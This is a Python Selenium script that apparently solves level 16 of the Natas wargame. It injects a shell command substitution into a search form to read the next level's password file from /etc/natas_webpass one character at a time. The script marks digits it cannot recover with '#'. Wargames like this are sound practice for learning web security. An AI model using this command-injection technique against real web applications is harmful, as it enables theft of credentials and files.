from common import *
'^$(cut -c 2-2 /etc/natas_webpass/natas17)'

def solve(driver, last_password):
    driver.get(build_url(level=16))
    
    password = ""
    for x in range(len(last_password)): # all passwords are the same length
        # ask for words starting with the x letter of the password
        driver.find_element(By.XPATH, '//*[@id="content"]/form/input[1]').send_keys(f'^$(cut -c {x+1}-{x+1} {build_webpass_path(17)})')
        driver.find_element(By.XPATH, '//*[@id="content"]/form/input[2]').click()

        WebDriverWait(driver, 10).until(lambda driver: driver.find_element(By.XPATH, '//*[@id="content"]/pre'))
        results = driver.find_element(By.XPATH, '//*[@id="content"]/pre').text.split()
        if len(results) == 0:
            password += "#" # means it's a number, idk how to find those yet
        else:
            password += results[0][0]
        print("password: ", password, end = '\r')
    print()
    
    driver.get(build_url(password = password, level=17))
    return password